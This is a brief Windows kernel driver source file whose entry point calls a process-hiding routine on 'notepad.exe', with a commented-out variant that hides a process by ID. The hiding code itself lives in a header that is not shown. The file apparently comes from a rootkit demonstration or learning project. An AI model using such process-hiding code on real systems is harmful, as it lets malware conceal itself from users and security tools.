#include <ntifs.h>
#include "HideProcess.h"

#define PROCESS_NAME "notepad.exe"

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;

	DriverObject->DriverUnload = [](PDRIVER_OBJECT DriverObject) {
		UNREFERENCED_PARAMETER(DriverObject);
	};

	HideProcessByName(PROCESS_NAME);
	//HideProcessByProcessId((HANDLE)9824);
	return status;
}